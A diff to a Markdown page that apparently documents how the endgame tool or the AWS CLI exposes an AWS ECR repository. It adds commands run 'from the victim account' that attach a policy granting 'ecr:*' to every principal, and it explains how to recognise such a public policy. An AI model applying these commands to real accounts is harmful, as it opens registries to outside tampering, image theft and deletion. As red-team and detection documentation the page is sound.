@@ -2,9 +2,67 @@
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+expose --service ecr --name test-resource-exposure
+```
+
+* Alternatively, to expose the resource using the AWS CLI:
+
+Create a file named `ecr-policy.json` with the following contents:
+
+```json
+{
+    "Version" : "2008-10-17",
+    "Statement" : [
+        {
+            "Sid" : "allow public pull",
+            "Effect" : "Allow",
+            "Principal" : "*",
+            "Action" : [
+                "ecr:*"
+            ]
+        }
+    ]
+}
+```
+
+Then run the following from the victim account:
+
+```bash
+aws ecr set-repository-policy --repository-name test-resource-exposure --policy-text file://ecr-policy.json
+```
+
+* To view the contents of the exposed resource policy, run the following:
+
+```bash
+aws ecr get-repository-policy \
+    --repository-name test-resource-exposure
+```
+
+* Observe that the contents match the example shown below.
+
+
 ## Example
 
+The policy shown below shows a policy that grants access to Principal `*`. If the output contains `*` in Principal, that means the ECR repository is public. If the Principal contains just an account ID, that means it is shared with another account.
+
+```json
+{
+    "registryId": "111122223333",
+    "repositoryName": "test-resource-exposure",
+    "policyText": "{\n  \"Version\" : \"2008-10-17\",\n  \"Statement\" : [ {\n    \"Sid\" : \"allow public pull\",\n    \"Effect\" : \"Allow\",\n    \"Principal\" : \"*\",\n    \"Action\" : \"ecr:*\"\n  } ]\n}"
+}
+```
+
 ## Exploitation
+
+```
+TODO
+```
 
 ## Remediation
 
